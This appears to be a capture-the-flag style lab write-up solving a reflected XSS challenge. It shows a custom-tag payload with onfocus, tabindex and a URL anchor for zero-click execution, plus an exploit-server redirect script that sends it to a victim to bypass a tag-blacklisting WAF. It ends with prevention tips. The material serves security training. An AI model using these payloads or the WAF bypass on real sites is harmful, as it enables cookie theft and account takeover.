# Lab 15: Reflected XSS into HTML context with all tags blocked except custom ones

**Goal**: Deliver a reflected XSS payload using a custom HTML tag with an `onfocus` event handler that automatically triggers `alert(document.cookie)`.

This lab blocks all standard HTML tags using a WAF filter. However, custom HTML tags (such as `<xss>`) are not blacklisted. By combining a custom tag with `id`, `onfocus`, `tabindex`, and URL hash navigation (`#x`), we can achieve automatic JavaScript execution without requiring user interaction.

---

## 🎯 Solution

1. Test custom HTML tag reflection in the search input box:
   ```html
   <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
   ```
2. Navigate to the Exploit Server and construct a redirect payload:
   ```html
   <script>
   location = 'https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x';
   </script>
   ```
3. Click **Store**, then click **Deliver exploit to victim** to solve the lab.

![Lab 15 Exploit Server Script Payload](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20164337.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze WAF Custom Tag Bypass
The application WAF blocks standard HTML tags (`<script>`, `<img>`, `<iframe>`, `<body>`, `<svg>`), returning `400 Bad Request`.

However, custom HTML tags (e.g., `<xss>`) are parsed validly by modern HTML5 browsers as custom DOM elements (`HTMLUnknownElement`).

### Step 2: Construct Custom Tag Payload
To trigger automatic execution on focus:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

#### Payload Breakdown:
- `<xss ...>`: Custom tag allowed by the WAF.
- `id=x`: Assigns element ID `x` for anchor targeting.
- `tabindex=1`: Makes the element focusable in the DOM tab order.
- `onfocus=alert(...)`: Event handler fired when the element receives focus.
- `#x` (URL Hash): Browsers automatically scroll and focus elements matching the URL anchor ID `#x` upon page load.

### Step 3: Exploit Server Delivery
Open the **Exploit Server** and enter the JavaScript redirection script in the **Body**:

```html
<script>
location = 'https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x';
</script>
```

*Replace `<YOUR-LAB-ID>` with your lab hostname.*

### Step 4: Execute & Deliver Exploit
1. Click **Store** to save the payload on the Exploit Server.
2. Click **View exploit** to test locally. The browser redirects to the target page, focuses the custom `<xss>` tag via `#x`, and executes `alert(document.cookie)`.
3. Click **Deliver exploit to victim**.

![Lab 15 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20164409.png)

> [!SUCCESS]
> **Lab Solved**: Delivered the custom tag exploit server payload to the victim, executing `alert(document.cookie)`!

---

## 💡 Key Takeaways: Custom Tag Exploitation

- **Custom HTML5 Elements**: Modern browsers allow arbitrary custom element tags (`<xss>`, `<custom-tag>`). If WAF rules only block standard HTML tags, custom tags bypass the filter.
- **Auto-Focusing via URL Anchors**: Combining `tabindex=1` with `onfocus` and a URL fragment `#elementId` enables zero-click automated payload execution.

---

## 🔒 Prevention

> [!TIP]
> 1. **Allowlist HTML Tags**: Use strict allowlists for acceptable tags rather than blacklisting specific tags.
> 2. **Context-Aware Entity Encoding**: Encode angle brackets `<` and `>` into `&lt;` and `&gt;` for all user input rendered in HTML text context.
